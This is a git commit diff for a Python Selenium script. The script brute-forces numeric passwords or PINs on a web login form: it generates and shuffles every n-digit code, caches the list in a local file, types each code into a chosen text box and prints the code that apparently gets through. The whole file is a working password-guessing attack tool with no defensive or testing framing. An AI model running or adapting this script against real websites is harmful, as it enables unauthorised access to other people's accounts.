a2da7e1c47a9bd4435ee6512181a7809869aaa7b
Ahmed Yasser <37325924+ahmedyasserays@users.noreply.github.com>
2020-12-03 00:24:16 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,32 +1,53 @@
 
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
-import random
+from random import shuffle
+import os
+from time import sleep
 
 # getting variables
 url = input("please insert the url: ")
 box = input("please insert the xpath of the text box: ")
-n = input("how many digits you want to put?\n")
-passwords_list = []
+n = int(input("how many digits you want to put?\n"))
+isFileExist = os.path.isfile(r"D:\python programming file\passwords" + str(n) + "digits.txt")
 
+
+# setting the driver
 driver = webdriver.Chrome()
 driver.get(url)
-driver.implicitly_wait(2)
-
+sleep(2)
 user = driver.find_element_by_xpath(box)
 
-for i in range(0, int("9" * n)):
-    passwords_list.append(i)
-random.shuffle(passwords_list)
-for password in passwords_list:
+# creating the passwords list
+if not isFileExist:
+    pass_list = [x for x in range(0, int("9" * n)+1)]
+    print("list created successfully")
+    shuffle(pass_list)
+    print('list shuffled successfully')
+    file = open(r"D:\python programming file\passwords" + str(n) + "digits.txt", "a")
+    counter = 0
+    for i in pass_list:
+        counter += 1
+        if (counter % 10000) == 0:
+            print('loading...')
+        file.write(str(i).zfill(n) + "\n")
+
+else:
+    file = open(r"D:\python programming file\passwords" + str(n) + "digits.txt", "r")
+    pass_list = file.readlines()
+
+
+# using the list to log in
+for password in pass_list:
 
     try:
-        user.send_keys(str(password).zfill(n))
+        user.clear()
+        user.send_keys(password + '\b')
         user.send_keys(Keys.RETURN)
         user = driver.find_element_by_xpath(box)
     except:
         print(password)
         break
-    user.clear()
 
 
+driver.close()
